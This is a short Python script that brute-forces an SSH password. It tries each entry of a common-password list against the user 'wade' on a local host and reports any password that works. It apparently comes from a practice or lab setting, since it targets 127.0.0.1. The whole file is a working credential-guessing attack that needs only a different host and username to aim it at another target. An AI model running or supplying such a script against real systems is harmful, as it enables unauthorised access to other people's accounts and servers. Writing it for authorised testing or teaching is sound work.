#!/bin/python

from pwn import *

import paramiko
import time

host = "127.0.0.1"
port = 22  # Default SSH port
username = "wade"
attempts = 1

with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            
            # Creating SSH connection
            response = paramiko.SSHClient()
            response.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            response.connect(host, port=port, username=username, password=password, timeout=5)
            
            print("[>] Valid password found: '{}'!".format(password))
            response.close()
            break
        
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")

        except paramiko.ssh_exception.SSHException as e:
            print(f"[X] SSH error: {e}")
        
        except Exception as e:
            print(f"[X] An error occurred: {e}")

        attempts += 1
        time.sleep(2)  # Add a delay between attempts to avoid overwhelming the server
